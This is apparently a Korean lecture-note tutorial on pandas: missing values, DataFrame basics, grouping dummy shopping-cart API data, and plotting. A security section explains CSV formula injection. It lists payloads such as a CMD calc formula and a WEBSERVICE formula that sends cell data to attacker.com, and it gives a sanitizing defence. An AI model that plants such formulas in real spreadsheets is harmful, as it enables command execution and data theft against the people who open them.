  2025-11-12     NaN
  2025-11-13    56.0
  Freq: D, dtype: float64
  ```

**최종 결과**: 날짜 인덱스를 가진 Series가 생성되었고, 11월 7일과 12일에 결측값이 포함되어 있습니다.

---

#### 2.6.2 결측값 확인: `isnull()` / `notnull()`

```python
# 결측값 확인
print("\n--- isnull() 결과 (결측값이면 True) ---")
print(pd.isnull(data_with_nan))

# 결측값이 아닌 값 확인
print("\n--- notnull() 결과 (결측값이 아니면 True) ---")
print(pd.notnull(data_with_nan))

# 불리언 마스킹으로 결측값만 선택
print("\n--- 결측값 데이터만 추출 ---")
print(data_with_nan[pd.isnull(data_with_nan)])
```

#### 💻 코드 실행 상세 분석

**1단계 (isnull() 함수)**:
- `pd.isnull(data_with_nan)`은 각 요소가 결측값인지 검사하여 **불리언 Series**를 반환합니다.
- 결측값이면 `True`, 아니면 `False`를 반환합니다.
- 출력 예시:
  ```
  2025-11-04    False
  2025-11-05    False
  2025-11-06    False
  2025-11-07     True  # NaN
  2025-11-08    False
  ...
  ```

**2단계 (notnull() 함수)**:
- `pd.notnull()`은 `pd.isnull()`의 반대로, 결측값이 **아니면** `True`를 반환합니다.

**3단계 (불리언 마스킹)**:
- `data_with_nan[pd.isnull(data_with_nan)]`은 `True`인 위치의 값만 추출합니다.
- 이를 **불리언 인덱싱** 또는 **불리언 마스킹**이라고 합니다.
- 출력:
  ```
  2025-11-07   NaN
  2025-11-12   NaN
  Freq: 5D, dtype: float64
  ```

**최종 결과**: 결측값의 위치를 정확히 파악하고, 결측값만 선택적으로 추출할 수 있습니다.

💡 **중요!**: 불리언 마스킹은 Pandas에서 매우 강력한 데이터 필터링 기법입니다. **조건을 만족하는 데이터만 선택**할 수 있어, 데이터 전처리와 분석에 필수적입니다.

---

#### 2.6.3 결측값 채우기: `fillna()` 메서드

결측값을 특정 값으로 채우는 방법입니다.

```python
# 방법 1: 0으로 결측값 채우기
filled_zero = data_with_nan.fillna(0)
print("\n--- fillna(0)으로 결측값 채우기 ---")
print(filled_zero)

# 방법 2: 평균값으로 결측값 채우기
mean_val = np.mean(data_with_nan)  # NaN은 자동으로 제외하고 평균 계산
filled_mean = data_with_nan.fillna(mean_val)
print("\n--- 평균값으로 결측값 채우기 ---")
print(filled_mean)
print(f"채운 평균값: {mean_val:.2f}")
```

#### 💻 코드 실행 상세 분석

**방법 1: 0으로 채우기**
- `data_with_nan.fillna(0)`은 모든 `NaN` 값을 `0`으로 대체합니다.
- **새로운 Series를 반환**하며, 원본은 변경되지 않습니다(불변성 유지).

**방법 2: 평균값으로 채우기**
- `np.mean(data_with_nan)`은 결측값을 제외한 나머지 값들의 평균을 계산합니다.
- NumPy의 통계 함수들은 기본적으로 `NaN`을 무시합니다.
- 계산된 평균값으로 결측값을 채웁니다.

**최종 결과**: 결측값이 적절한 값으로 대체되어, 이후 분석에 활용할 수 있게 됩니다.

📌 **노트**: 결측값을 어떻게 처리할지는 **데이터의 성격과 분석 목적**에 따라 달라집니다. 평균값으로 채우는 것이 항상 최선은 아니며, 때로는 중앙값, 최빈값, 또는 선형 보간법 등을 사용하는 것이 더 적절할 수 있습니다.

---

#### 2.6.4 결측값 제거: `dropna()` 메서드

결측값이 있는 행을 완전히 제거하는 방법입니다.

```python
# 결측값 제거
dropped_nan = data_with_nan.dropna()
print("\n--- dropna()로 결측값 제거 ---")
print(dropped_nan)
print(f"원본 크기: {len(data_with_nan)}, 제거 후 크기: {len(dropped_nan)}")
```

#### 💻 코드 실행 상세 분석

**1단계 (dropna() 호출)**:
- `data_with_nan.dropna()`는 `NaN` 값이 있는 모든 행을 제거합니다.
- **새로운 Series를 반환**하며, 원본은 유지됩니다.

**2단계 (크기 비교)**:
- 원본은 10개 요소, 제거 후에는 8개 요소(2개의 NaN 제거됨)를 가집니다.

**최종 결과**: 결측값이 완전히 제거된 깨끗한 데이터를 얻을 수 있습니다.

💡 **중요!**: `dropna()`는 데이터 손실을 초래하므로 신중하게 사용해야 합니다. **데이터의 양이 충분하고, 결측값의 비율이 낮을 때** 사용하는 것이 좋습니다. 결측값이 많거나 데이터가 부족한 경우에는 `fillna()`로 채우는 것이 더 나을 수 있습니다.

---

## 🗂️ Section 3: Pandas DataFrame 소개 및 활용

### 3.1 왜 DataFrame이 필요한가?

Series는 1차원 데이터 구조로, **하나의 열(column)**만 표현할 수 있습니다. 하지만 실제 데이터는 대부분 **여러 열**을 가진 **표(table) 형태**입니다. 예를 들어:

- 사용자 데이터: 이름, 나이, 이메일, 가입일 등 여러 속성
- 기후 데이터: 날짜, 지점, 평균기온, 최저기온, 최고기온
- 판매 데이터: 제품명, 가격, 수량, 판매일, 고객 ID

**DataFrame**은 **여러 개의 Series를 열로 가지는 2차원 데이터 구조**입니다. 엑셀의 스프레드시트나 SQL의 테이블과 유사한 구조로, 데이터 분석의 핵심 도구입니다.

**DataFrame의 핵심 특징:**
- **2차원 구조**: 행(row)과 열(column)을 모두 가짐
- **각 열은 Series**: 각 열은 독립적인 Series이며, 서로 다른 데이터 타입을 가질 수 있음
- **행과 열 모두에 인덱스**: 행 인덱스(index)와 열 이름(columns)으로 데이터에 접근
- **다양한 생성 방법**: 딕셔너리, 2차원 배열, CSV 파일 등 다양한 소스에서 생성 가능

---

### 3.2 DataFrame 생성 방법

#### 3.2.1 딕셔너리로 DataFrame 생성

가장 직관적인 방법으로, **딕셔너리의 키가 열 이름**이 되고, **값이 열 데이터**가 됩니다.

```python
# 딕셔너리로 DataFrame 생성
df_data = {
    'feature01': [1, 2, 3],
    'feature02': [10, 20, 30],
    'feature03': [100, 200, 300]
}

df_from_dict = pd.DataFrame(df_data)
print("--- 딕셔너리로 DataFrame 생성 ---")
print(df_from_dict)
print(f"\nDataFrame 타입: {type(df_from_dict)}")
print(f"DataFrame 형상(shape): {df_from_dict.shape}")
```

#### 💻 코드 실행 상세 분석

**1단계 (딕셔너리 생성)**:
- 각 키(`'feature01'`, `'feature02'`, `'feature03'`)는 열 이름이 됩니다.
- 각 값(리스트)은 해당 열의 데이터가 됩니다.
- 모든 리스트의 길이는 같아야 합니다. 만약 길이가 다르면 `ValueError`가 발생합니다.

**2단계 (DataFrame 생성)**:
- `pd.DataFrame(df_data)`를 호출하면, 딕셔너리를 DataFrame으로 변환합니다.
- 행 인덱스는 자동으로 `0, 1, 2, ...`로 생성됩니다.

**3단계 (결과 확인)**:
- 출력:
  ```
     feature01  feature02  feature03
  0          1         10        100
  1          2         20        200
  2          3         30        300
  ```
- `type(df_from_dict)`: `<class 'pandas.core.frame.DataFrame'>`
- `df_from_dict.shape`: `(3, 3)` (3행 3열)

**최종 결과**: 3개의 열과 3개의 행을 가진 DataFrame이 생성되었습니다. 이는 표 형태의 데이터 구조로, 각 열은 독립적인 데이터를 담고 있습니다.

💡 **중요!**: DataFrame의 `shape` 속성은 `(행 개수, 열 개수)` 순서입니다. NumPy 배열의 shape와 동일한 형식입니다.

---

#### 3.2.2 2차원 배열로 DataFrame 생성

NumPy 2차원 배열이나 중첩 리스트에서 DataFrame을 생성할 수 있습니다.

```python
# 2차원 배열(중첩 리스트)로 DataFrame 생성
df_from_arr = pd.DataFrame(
    data=[[1, 2, 3], [4, 5, 6], [7, 8, 9]],
    columns=['A', 'B', 'C'],
    index=['row_0', 'row_1', 'row_2']
)

print("--- 2차원 배열로 DataFrame 생성 ---")
print(df_from_arr)
```

#### 💻 코드 실행 상세 분석

**1단계 (데이터 준비)**:
- `[[1, 2, 3], [4, 5, 6], [7, 8, 9]]`는 3x3 크기의 2차원 리스트입니다.
- 각 내부 리스트는 하나의 행을 나타냅니다.

**2단계 (DataFrame 생성)**:
- `columns=['A', 'B', 'C']`로 열 이름을 지정합니다.
- `index=['row_0', 'row_1', 'row_2']`로 행 인덱스를 지정합니다.
- 데이터, 열 이름, 행 인덱스의 크기가 모두 일치해야 합니다.

**3단계 (결과 확인)**:
- 출력:
  ```
         A  B  C
  row_0  1  2  3
  row_1  4  5  6
  row_2  7  8  9
  ```

**최종 결과**: 명시적인 행/열 이름을 가진 DataFrame이 생성되었습니다. 이러한 레이블은 데이터의 의미를 명확히 하는 데 매우 유용합니다.

---

### 3.3 DataFrame 열 이름 변경: `rename()` 메서드

생성 후 열 이름을 변경해야 할 때가 있습니다. `rename()` 메서드를 사용하면 됩니다.

```python
# 열 이름 변경
df_from_arr.rename(columns={'A': 'col_A', 'B': 'col_B'}, inplace=True)

print("\n--- 열 이름 변경 후 ---")
print(df_from_arr)
```

#### 💻 코드 실행 상세 분석

**1단계 (rename() 호출)**:
- `columns` 파라미터에 딕셔너리를 전달합니다. 키는 기존 열 이름, 값은 새로운 열 이름입니다.
- `{'A': 'col_A', 'B': 'col_B'}`는 'A' 열을 'col_A'로, 'B' 열을 'col_B'로 변경하라는 의미입니다.

**2단계 (inplace 파라미터)**:
- `inplace=True`를 지정하면, **원본 DataFrame을 직접 수정**합니다.
- `inplace=False`(기본값)이면 새로운 DataFrame을 반환하고 원본은 그대로 유지됩니다.

**3단계 (결과 확인)**:
- 출력:
  ```
         col_A  col_B  C
  row_0      1      2  3
  row_1      4      5  6
  row_2      7      8  9
  ```
- 'A'와 'B' 열의 이름이 변경되었고, 'C' 열은 그대로 유지됩니다.

**최종 결과**: 필요한 열의 이름만 선택적으로 변경할 수 있습니다.

📌 **노트**: `inplace=True`는 메모리 효율적이지만, 원본 데이터를 잃게 됩니다. 데이터가 크지 않다면 `inplace=False`를 사용하여 원본을 보존하는 것이 안전합니다.

---

### 3.4 DataFrame 열 추가 및 삭제

DataFrame은 동적으로 열을 추가하거나 삭제할 수 있습니다.

```python
# 열 추가
df_from_arr['col_D'] = [11, 12, 13]
print("\n--- 'col_D' 추가 후 ---")
print(df_from_arr)

# 열 삭제
del df_from_arr['col_D']
print("\n--- 'col_D' 삭제 후 ---")
print(df_from_arr)
```

#### 💻 코드 실행 상세 분석

**열 추가 분석**:
- `df_from_arr['col_D'] = [11, 12, 13]`는 새로운 열 'col_D'를 추가합니다.
- 딕셔너리에 새 키-값 쌍을 추가하는 것과 유사한 문법입니다.
- 리스트의 길이는 DataFrame의 행 개수와 일치해야 합니다(3개).
- 결과:
  ```
         col_A  col_B  C  col_D
  row_0      1      2  3     11
  row_1      4      5  6     12
  row_2      7      8  9     13
  ```

**열 삭제 분석**:
- `del df_from_arr['col_D']`는 'col_D' 열을 삭제합니다.
- Python의 `del` 키워드를 사용하여 열을 제거합니다.
- 결과:
  ```
         col_A  col_B  C
  row_0      1      2  3
  row_1      4      5  6
  row_2      7      8  9
  ```

**최종 결과**: DataFrame은 유연하게 구조를 변경할 수 있어, 데이터 전처리 과정에서 매우 유용합니다.

💡 **중요!**: `del`은 즉시 원본을 수정합니다. 만약 원본을 보존하고 싶다면 `df.drop('col_D', axis=1)` 메서드를 사용하세요(`axis=1`은 열을 의미).

---

## 🔐 Section 4: 보안 노트 - CSV Injection 공격

### 4.1 왜 CSV Injection이 위험한가?

CSV 파일은 단순한 텍스트 파일처럼 보이지만, **Microsoft Excel, Google Sheets** 등의 스프레드시트 프로그램으로 열면 **수식(formula)이 자동으로 실행**될 수 있습니다. 악의적인 사용자가 이를 악용하여 다음과 같은 공격을 시도할 수 있습니다:

- **명령 실행**: `=CMD|'/C CALC'!A1`과 같은 수식으로 시스템 명령 실행
- **데이터 유출**: `=WEBSERVICE("http://attacker.com/?data="&A1)`로 민감한 데이터를 외부로 전송
- **피싱**: 악성 URL로 리다이렉트

이러한 공격은 **CSV Injection** 또는 **Formula Injection**이라고 불리며, 보안 취약점으로 분류됩니다.

---

### 4.2 CSV Injection 시뮬레이션

실제 공격 시나리오를 시뮬레이션하여 위험성을 이해해봅시다.

```python
# CSV Injection 시뮬레이션
import os

# 악의적인 입력을 포함한 데이터 생성
malicious_input = '=SUM(1+1)*CMD|\'/C CALC\'!A1'
safe_input = 'Normal User'

# DataFrame 생성
injection_df = pd.DataFrame({
    'username': [safe_input, malicious_input],
    'value': [100, 200]
})

# CSV 파일로 저장
injection_df.to_csv('injection_example.csv', index=False)
print("--- 'injection_example.csv' 파일 생성 ---")
print(injection_df)
print("\n⚠️ 경고: 이 파일을 Excel로 열면 악성 코드가 실행될 수 있습니다!")
```

#### 💻 코드 실행 상세 분석

**1단계 (악의적인 데이터 생성)**:
- `'=SUM(1+1)*CMD|\'/C CALC\'!A1'`는 Excel에서 수식으로 인식되는 문자열입니다.
- `=`로 시작하면 Excel은 이를 수식으로 해석합니다.
- `CMD`는 Windows 명령 프롬프트를 실행하고, `CALC`는 계산기를 실행하는 명령입니다.

**2단계 (DataFrame 생성 및 저장)**:
- 정상적인 입력과 악의적인 입력을 함께 DataFrame에 넣습니다.
- `to_csv()` 메서드로 CSV 파일로 저장합니다.

**3단계 (파일 확인)**:
- 생성된 `injection_example.csv` 파일을 **텍스트 에디터**로 열면 다음과 같이 보입니다:
  ```csv
  username,value
  Normal User,100
  =SUM(1+1)*CMD|'/C CALC'!A1,200
  ```

**4단계 (위험 상황)**:
- 이 파일을 **Excel로 열면**, Excel은 `=`로 시작하는 셀을 수식으로 인식합니다.
- 보안 경고가 표시되지만, 사용자가 무심코 "활성화"를 클릭하면 악성 코드가 실행됩니다.

**최종 결과**: CSV 파일에 악의적인 수식이 포함되어 있으며, 이는 심각한 보안 위협이 될 수 있습니다.

🔐 **보안 노트**: CSV Injection은 OWASP Top 10에는 포함되지 않지만, 실제로 많이 발생하는 공격입니다. 특히 **사용자 입력을 CSV로 저장하는 웹 애플리케이션**에서 주의해야 합니다.

---

### 4.3 CSV Injection 방어 방법

안전한 CSV 파일을 생성하려면 다음과 같은 방어 기법을 적용해야 합니다.

```python
def sanitize_for_csv(text):
    """
    CSV Injection 공격을 방지하기 위해 입력값을 검증하고 안전하게 처리합니다.
    
    Args:
        text: 검증할 텍스트 (str 또는 다른 타입)
    
    Returns:
        안전하게 처리된 텍스트
    """
    # 문자열이 아니면 그대로 반환
    if not isinstance(text, str):
        return text
    
    # 위험한 시작 문자 확인
    dangerous_starts = ('=', '+', '-', '@', '\t', '\r')
    
    if text.startswith(dangerous_starts):
        # 위험한 문자로 시작하면 앞에 작은따옴표를 추가하여 텍스트로 강제 인식
        return "'" + text
    
    return text


# 안전하게 처리된 DataFrame 생성
sanitized_df = pd.DataFrame({
    'username': [
        sanitize_for_csv(safe_input), 
        sanitize_for_csv(malicious_input)
    ],
    'value': [100, 200]
})

sanitized_df.to_csv('sanitized_example.csv', index=False)
print("\n--- 안전하게 처리된 'sanitized_example.csv' 파일 생성 ---")
print(sanitized_df)

# 파일 내용 확인
with open('sanitized_example.csv', 'r', encoding='utf-8') as f:
    print("\n--- 파일 내용 ---")
    print(f.read())

# 임시 파일 정리
if os.path.exists('injection_example.csv'):
    os.remove('injection_example.csv')
if os.path.exists('sanitized_example.csv'):
    os.remove('sanitized_example.csv')
```

#### 💻 코드 실행 상세 분석

**1단계 (sanitize_for_csv() 함수 정의)**:
- 입력값이 문자열인지 확인합니다. 숫자나 다른 타입이면 그대로 반환합니다.
- `dangerous_starts` 튜플에 위험한 시작 문자들을 정의합니다.
  - `=`: Excel 수식 시작
  - `+`: 덧셈 수식
  - `-`: 뺄셈 수식 (음수와 혼동될 수 있음)
  - `@`: 외부 데이터 참조
  - `\t`, `\r`: 탭과 캐리지 리턴 (특수 문자 삽입 공격)

**2단계 (위험 문자 처리)**:
- 입력 문자열이 위험한 문자로 시작하면, **작은따옴표(`'`)를 앞에 추가**합니다.
- Excel은 작은따옴표로 시작하는 셀을 **일반 텍스트**로 인식하므로, 수식으로 해석되지 않습니다.

**3단계 (안전한 DataFrame 생성)**:
- 모든 사용자 입력에 `sanitize_for_csv()` 함수를 적용합니다.
- 결과적으로 악의적인 입력이 `'=SUM(1+1)*CMD|...`과 같이 저장됩니다.

**4단계 (파일 확인)**:
- 생성된 파일을 열면 다음과 같이 보입니다:
  ```csv
  username,value
  Normal User,100
  '=SUM(1+1)*CMD|'/C CALC'!A1,200
  ```
- 작은따옴표로 인해 Excel이 이를 텍스트로 인식하므로, 수식이 실행되지 않습니다.

**5단계 (파일 정리)**:
- 임시로 생성한 테스트 파일들을 삭제하여 환경을 정리합니다.

**최종 결과**: 사용자 입력이 안전하게 처리되어, CSV Injection 공격이 방지됩니다.

🔐 **보안 모범 사례**:
1. **모든 사용자 입력은 신뢰할 수 없다고 가정**하고 검증합니다.
2. CSV 파일을 생성할 때는 반드시 **입력값 검증(Input Validation)**을 수행합니다.
3. 가능하면 **화이트리스트 방식**(허용된 문자만 통과)을 사용합니다.
4. 사용자에게 CSV 파일을 다운로드할 때, **매크로나 외부 연결을 활성화하지 말라는 경고**를 제공합니다.

📌 **노트**: 강사님께서는 "**보안은 항상 데이터 입력 단계에서부터 시작됩니다. 출력 단계에서만 처리하는 것은 너무 늦습니다**"라고 강조하셨습니다.

---

## 🧩 Section 5: 복합 및 심화 예제 - 온라인 쇼핑 데이터 분석

### 5.1 실습 목표

이 섹션에서는 지금까지 배운 모든 내용을 통합하여 **실제 웹 API에서 데이터를 가져와 분석하는 과정**을 실습합니다. 다음 단계를 따라갑니다:

1. **데이터 수집**: 웹 API에서 JSON 데이터 로드
2. **데이터 전처리**: 중첩된 JSON 구조를 평탄화하여 DataFrame으로 변환
3. **데이터 분석**: 그룹화 및 집계를 통해 인사이트 도출
4. **AI 연동 시뮬레이션**: 분석 결과를 JSON으로 변환하여 AI 서비스에 요청하는 과정 시뮬레이션

---

### 5.2 웹 API에서 데이터 로드

```python
import urllib.request
import json

try:
    # 1. 데이터 준비: 웹 API로부터 JSON 데이터 로드
    endpoint = 'https://dummyjson.com/carts'
    
    with urllib.request.urlopen(endpoint) as response:
        result = json.loads(response.read())
    
    print("--- API 응답 구조 확인 ---")
    print(f"응답 키: {result.keys()}")
    print(f"총 카트 개수: {len(result['carts'])}")
    print(f"\n첫 번째 카트 샘플:")
    print(json.dumps(result['carts'][0], indent=2, ensure_ascii=False))

except Exception as e:
    print(f"\n⚠️ API 호출 실패: {e}")
    print("인터넷 연결을 확인하거나 API 엔드포인트가 유효한지 확인해주세요.")
```

#### 💻 코드 실행 상세 분석

**1단계 (API 엔드포인트 설정)**:
- `'https://dummyjson.com/carts'`는 무료로 제공되는 더미(dummy) 데이터 API입니다.
- 실제 쇼핑몰 데이터와 유사한 구조의 테스트 데이터를 제공합니다.

**2단계 (HTTP 요청 및 응답 처리)**:
- `urllib.request.urlopen(endpoint)`로 HTTP GET 요청을 보냅니다.
- `response.read()`로 응답 본문을 바이트 형태로 읽습니다.
- `json.loads()`로 JSON 문자열을 Python 딕셔너리로 파싱합니다.

**3단계 (응답 구조 확인)**:
- `result.keys()`로 응답의 최상위 키들을 확인합니다. 일반적으로 `['carts', 'total', 'skip', 'limit']` 등이 포함됩니다.
- `result['carts']`는 쇼핑 카트 정보를 담은 리스트입니다.

**4단계 (샘플 데이터 출력)**:
- 첫 번째 카트의 구조를 예쁘게 출력하여 데이터 형식을 파악합니다.
- 예상 출력:
  ```json
  {
    "id": 1,
    "userId": 97,
    "total": 4998,
    "discountedTotal": 4248.5,
    "products": [
      {
        "id": 144,
        "title": "Laptop",
        "price": 1499,
        "quantity": 1
      },
      ...
    ]
  }
  ```

**5단계 (예외 처리)**:
- 네트워크 오류, API 장애 등 다양한 예외 상황을 포착하여 사용자에게 알립니다.

**최종 결과**: API에서 쇼핑 카트 데이터를 성공적으로 가져와 Python 딕셔너리 형태로 메모리에 로드했습니다.

---

### 5.3 데이터 전처리: 중첩 구조 평탄화

API 응답은 중첩된 JSON 구조로 되어 있어, 직접 분석하기 어렵습니다. 이를 **평탄화(Flatten)**하여 DataFrame으로 변환해야 합니다.

```python
# 2. 데이터 전처리 및 DataFrame 생성
rows = []

for cart in result['carts']:
    # 각 카트의 제품들을 순회
    for prod in cart['products']:
        # 카트 정보와 제품 정보를 결합하여 하나의 행(row)으로 만듦
        rows.append({
            "userId": cart["userId"],
            "total": cart["total"],
            "discountedTotal": cart["discountedTotal"],
            "product_title": prod["title"],
            "product_price": prod["price"],
            "product_quantity": prod["quantity"]
        })

# DataFrame 생성
shopping_df = pd.DataFrame(rows)

print("\n--- 쇼핑 데이터 DataFrame (상위 10개) ---")
print(shopping_df.head(10))
print(f"\n전체 행 개수: {len(shopping_df)}")
print(f"열 이름: {shopping_df.columns.tolist()}")
```

#### 💻 코드 실행 상세 분석

**1단계 (빈 리스트 초기화)**:
- `rows = []`는 평탄화된 데이터를 담을 빈 리스트를 생성합니다.

**2단계 (이중 for 루프)**:
- 외부 루프 `for cart in result['carts']`는 모든 카트를 순회합니다.
- 내부 루프 `for prod in cart['products']`는 각 카트의 모든 제품을 순회합니다.
- **중첩된 구조를 평탄화**하는 핵심 단계입니다.

**3단계 (행 데이터 생성)**:
- 각 제품에 대해 카트 정보(userId, total, discountedTotal)와 제품 정보(title, price, quantity)를 결합합니다.
- 이를 딕셔너리 형태로 `rows` 리스트에 추가합니다.

**4단계 (DataFrame 변환)**:
- `pd.DataFrame(rows)`로 딕셔너리 리스트를 DataFrame으로 변환합니다.
- 각 딕셔너리가 하나의 행이 되고, 키들이 열 이름이 됩니다.

**5단계 (결과 확인)**:
- `head(10)`으로 상위 10개 행을 출력하여 데이터 구조를 확인합니다.
- 예상 출력:
  ```
     userId  total  discountedTotal product_title  product_price  product_quantity
  0      97   4998           4248.5        Laptop           1499                 1
  1      97   4998           4248.5    Smartphone            799                 2
  2      33   3102           2745.9       Headset             89                 1
  ...
  ```

**최종 결과**: 중첩된 JSON 데이터가 **행-열 구조의 평탄한 DataFrame**으로 변환되어, 이제 Pandas의 강력한 분석 기능을 사용할 수 있게 되었습니다.

💡 **중요!**: 중첩된 데이터를 평탄화하는 것은 **데이터 전처리의 핵심 과정**입니다. 실무에서는 JSON, XML 등 계층적 데이터를 자주 다루게 되므로, 이러한 변환 기술을 숙달하는 것이 중요합니다.

---

### 5.4 데이터 분석: 그룹화 및 집계

이제 DataFrame을 사용하여 의미 있는 인사이트를 도출해봅시다.

#### 5.4.1 사용자별 총 구매액 분석

```python
# 3.1. 사용자별 총 구매액(할인 후) 계산 및 상위 5명 추출
user_spending = shopping_df.groupby("userId")["discountedTotal"].first().sort_values(ascending=False)

print("\n--- 사용자별 총 구매액 (상위 5명) ---")
print(user_spending.head())
print(f"\n최고 구매자 ID: {user_spending.index[0]}")
print(f"최고 구매액: ${user_spending.iloc[0]:,.2f}")
```

#### 💻 코드 실행 상세 분석

**1단계 (groupby() 메서드)**:
- `shopping_df.groupby("userId")`는 DataFrame을 `userId` 열을 기준으로 그룹화합니다.
- 각 그룹은 동일한 `userId`를 가진 행들의 모음입니다.

**2단계 (열 선택 및 집계)**:
- `["discountedTotal"]`로 할인 후 총액 열만 선택합니다.
- `.first()`는 각 그룹의 첫 번째 값을 가져옵니다. `discountedTotal`은 카트 전체의 총액이므로, 같은 카트 내 모든 제품이 동일한 값을 가지기 때문에 `first()`를 사용합니다.
- 대안: `.mean()`, `.sum()`, `.max()` 등 다양한 집계 함수 사용 가능

**3단계 (정렬)**:
- `.sort_values(ascending=False)`로 내림차순 정렬하여 최고 구매자부터 표시합니다.

**4단계 (상위 5명 출력)**:
- `.head()`로 상위 5명의 데이터를 출력합니다.
- 예상 출력:
  ```
  userId
  177    524.98
  154    479.99
  127    439.50
  ...
  Name: discountedTotal, dtype: float64
  ```

**최종 결과**: 사용자 ID 177번이 약 $524.98를 지출하여 최고 구매자임을 알 수 있습니다.

---

#### 5.4.2 가장 많이 팔린 상품 분석

```python
# 3.2. 가장 많이 팔린 상품 Top 5 (수량 기준)
top_products = shopping_df.groupby("product_title")["product_quantity"].sum().sort_values(ascending=False)

print("\n--- 가장 많이 팔린 상품 (상위 5개) ---")
print(top_products.head())
print(f"\n베스트셀러: {top_products.index[0]}")
print(f"판매 수량: {top_products.iloc[0]}개")
```

#### 💻 코드 실행 상세 분석

**1단계 (상품명으로 그룹화)**:
- `groupby("product_title")`로 동일한 상품명을 가진 행들을 그룹화합니다.

**2단계 (수량 합계 계산)**:
- `["product_quantity"].sum()`으로 각 상품의 총 판매 수량을 계산합니다.
- 예를 들어, "Laptop"이 여러 카트에 각각 1개씩 담겨 있었다면, 전체 판매 수량은 그 합계가 됩니다.

**3단계 (정렬 및 상위 5개 추출)**:
- 판매 수량이 많은 순서대로 정렬하고, 상위 5개를 출력합니다.
- 예상 출력:
  ```
  product_title
  Smartphone       45
  Laptop           38
  Wireless Mouse   32
  ...
  Name: product_quantity, dtype: int64
  ```

**최종 결과**: "Smartphone"이 45개 판매되어 베스트셀러임을 확인할 수 있습니다.

📌 **노트**: `groupby()`는 SQL의 `GROUP BY`와 유사한 기능으로, **데이터를 그룹으로 묶어 집계**하는 강력한 도구입니다. 강사님께서는 "**SQL을 잘 하시는 분들에게 매우 도움이 됩니다**"라고 말씀하셨습니다.

---

### 5.5 AI 연동 시뮬레이션

분석 결과를 AI 서비스에 전송하여 추가 인사이트를 얻는 과정을 시뮬레이션합니다.

```python
# 4. AI 연동 시뮬레이션
# 분석 결과를 JSON으로 변환하여 AI에 요약 요청

ai_request_data = {
    "top_spender_id": int(user_spending.index[0]),
    "top_spender_amount": float(user_spending.iloc[0]),
    "top_product_name": top_products.index[0],
    "top_product_quantity": int(top_products.iloc[0])
}

ai_request_payload = json.dumps(ai_request_data, indent=2)

print("\n--- AI 요약 요청 페이로드 ---")
print(ai_request_payload)

# AI의 응답을 가정하고 파싱 (실제로는 API 호출)
ai_response_json = f'''
&#123;% raw %&#125;&#123;&#123;
    "summary": "Key insights from recent sales data:",
    "top_customer_insight": "User #{ai_request_data['top_spender_id']} is the highest spender with ${ai_request_data['top_spender_amount']:.2f}.",
    "top_product_insight": "The product '{ai_request_data['top_product_name']}' is the best-seller with {ai_request_data['top_product_quantity']} units sold.",
    "recommendation": "Focus marketing efforts on top spenders and ensure adequate stock of best-selling products."
&#125;&#125;&#123;% endraw %&#125;
'''

summary_report = json.loads(ai_response_json)

print("\n--- AI 응답 요약 ---")
print(summary_report['summary'])
print(f"- {summary_report['top_customer_insight']}")
print(f"- {summary_report['top_product_insight']}")
print(f"- 추천 사항: {summary_report['recommendation']}")
```

#### 💻 코드 실행 상세 분석

**1단계 (AI 요청 데이터 준비)**:
- 분석 결과에서 추출한 핵심 정보(최고 구매자 ID, 금액, 베스트셀러 상품명, 판매 수량)를 딕셔너리로 구성합니다.
- `int()`, `float()`로 타입을 명시적으로 변환하여 JSON 직렬화 오류를 방지합니다.

**2단계 (JSON 직렬화)**:
- `json.dumps()`로 딕셔너리를 JSON 문자열로 변환합니다.
- `indent=2`로 예쁘게 포맷팅하여 가독성을 높입니다.

**3단계 (AI 응답 시뮬레이션)**:
- 실제로는 OpenAI API, Claude API 등에 HTTP 요청을 보내겠지만, 여기서는 응답을 하드코딩하여 시뮬레이션합니다.
- f-string을 사용하여 동적으로 값을 삽입합니다.

**4단계 (응답 파싱 및 출력)**:
- `json.loads()`로 JSON 문자열을 다시 Python 딕셔너리로 파싱합니다.
- 딕셔너리에서 필요한 필드를 추출하여 사용자에게 친절한 형태로 출력합니다.

**최종 결과**:
```
--- AI 응답 요약 ---
Key insights from recent sales data:
- User #177 is the highest spender with $524.98.
- The product 'Smartphone' is the best-seller with 45 units sold.
- 추천 사항: Focus marketing efforts on top spenders and ensure adequate stock of best-selling products.
```

💡 **중요!**: 이 예제는 **데이터 분석 → AI 활용 → 의사결정**으로 이어지는 현대적인 데이터 파이프라인을 보여줍니다. 실무에서는 이러한 흐름이 자동화되어 운영됩니다.

---

## 📊 Section 6: 데이터 시각화 맛보기 - Matplotlib

### 6.1 왜 시각화가 필요한가?

강사님께서는 강의 마지막에 "**마지막에 그래도 뭔가 흥미가 생기지 않았나요?**"라며 시각화를 보여주셨습니다. 숫자로만 된 분석 결과는 이해하기 어렵지만, **그래프로 표현하면 한눈에 패턴을 파악**할 수 있습니다.

**시각화의 장점:**
- **직관적 이해**: 복잡한 데이터를 시각적으로 표현하여 이해도 향상
- **패턴 발견**: 트렌드, 이상치, 상관관계 등을 쉽게 발견
- **의사소통**: 비기술자에게도 쉽게 설명 가능
- **보고서 작성**: 경영진, 고객에게 설득력 있는 자료 제공

---

### 6.2 Matplotlib을 사용한 막대 그래프

```python
import matplotlib.pyplot as plt

# 사용자별 구매액 상위 10명 추출
top_10_users = user_spending.head(10)

# 막대 그래프 생성
top_10_users.plot(kind='bar', figsize=(10, 4), title="User Purchase Amount (USD)")
plt.xlabel("User ID")
plt.ylabel("Purchase Amount ($)")
plt.xticks(rotation=45)  # x축 레이블 회전
plt.tight_layout()  # 레이아웃 자동 조정
plt.show()
```

#### 💻 코드 실행 상세 분석

**1단계 (데이터 준비)**:
- `user_spending.head(10)`으로 상위 10명의 구매액 데이터를 추출합니다.

**2단계 (그래프 생성)**:
- `.plot(kind='bar', ...)`는 Pandas Series에 내장된 시각화 메서드입니다.
- `kind='bar'`: 막대 그래프를 생성합니다.
- `figsize=(10, 4)`: 그래프 크기를 가로 10인치, 세로 4인치로 설정합니다.
- `title="..."`: 그래프 제목을 지정합니다.

**3단계 (축 레이블 및 스타일 설정)**:
- `plt.xlabel()`: x축 레이블 설정
- `plt.ylabel()`: y축 레이블 설정
- `plt.xticks(rotation=45)`: x축 레이블을 45도 회전하여 겹치지 않게 함
- `plt.tight_layout()`: 레이아웃을 자동으로 조정하여 레이블이 잘리지 않게 함

**4단계 (그래프 표시)**:
- `plt.show()`를 호출하면 그래프가 화면에 표시됩니다.
- Jupyter Notebook에서는 자동으로 표시되지만, Python 스크립트에서는 `plt.show()`가 필수입니다.

**최종 결과**: 사용자별 구매액이 막대 그래프로 표시되어, 누가 얼마나 구매했는지 한눈에 파악할 수 있습니다.

